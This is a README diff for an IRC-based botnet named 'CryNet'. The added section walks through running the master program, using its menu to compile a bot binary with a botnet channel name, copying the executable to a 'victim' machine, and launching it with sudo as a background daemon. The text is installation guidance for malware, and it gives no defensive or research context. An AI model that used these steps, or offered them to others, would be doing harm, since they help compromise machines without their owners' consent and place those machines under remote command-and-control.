@@ -176,3 +176,50 @@ OR
 ```
 sudo ./irc_bot NO_DAEMON
 ```
+
+**Bot Installation - Master Setup**
+1. Run the master program, ensure that the master setup has been complete
+
+```
+cd src/master/
+python ./MasterProgram.py
+```
+
+2. Run through the bot compilation process in the master program
+
+```
+~~~~~~~~~~~~~~~~~~~~~~~CryNet Master Options~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Master options (input number to select option):
+1. Connect to CryNet IRC server
+2. Enter command center
+3. Enter manual IRC console
+4. View bot staistics
+5. Compile a new bot
+Option: 5
+----------------------CryNet Bot Compilation----------------------
+To a compile a bot with a specific level of complexity, follow given instructions
+(Note: This compiler will only work if g++ is installed and the master program is running from the 'master' directory)
+=========================General Bot Setup=========================
+Enter the name of the executable: irc_bot
+Enter the output path of this binary (no input will be the cwd):
+Would you like to strip the binay? Stripping is recommended since it removes debugging informationa and untouched code, which reduces the exe size.
+Enter 'n' to not strip the exe:
+=========================Bot Macros Setup=========================
+(Note: these values will be passed to the bot as essentially compilation time params)
+Enter a botnet channel name (must start with '#'):
+...
+```
+
+3. Move the executable to the deseired "victim" machine 
+
+4. Run the executable, it default runs as a background process. Otherwise, use "NO_DAEMON" command-line argument 
+
+```
+sudo ./irc_bot
+``` 
+
+OR
+
+```
+sudo ./irc_bot NO_DAEMON
+```
